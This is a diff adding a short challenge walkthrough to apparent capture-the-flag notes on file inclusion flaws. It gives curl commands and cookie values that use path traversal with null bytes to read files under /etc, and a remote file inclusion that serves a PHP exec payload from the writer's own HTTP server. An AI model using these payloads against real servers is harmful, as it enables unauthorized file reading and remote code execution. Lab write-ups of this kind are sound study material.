@@ -24,3 +24,9 @@
 ![[file16.png]]
 ![[file17.png]]
 ![[file18.png]]
+
+CHALLENGES
+- To get the first flag, we can put this in terminal: `curl -X POST https://MACHINEIP/challenges/chall1.php -d 'method=GET&file=/etc/flag1'`
+- To get the second flag, we open burpsuite and put on cookie `../../../../etc/flag2%00`
+- To get the third flag, we put this in terminal: `curl -X POST https://MACHINEIP/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00'`
+- To get the hostname (Remote File Inclusion), whe set up our remote server writing `sudo python3 -m http.server` and then we create a file txt with the content: `<?php print exec('hostname'); ?>` and we intruduce on the url `http://MACHINEIP/playground.php?file=http://myIP:PORT/file.txt` and the hostname is shown.
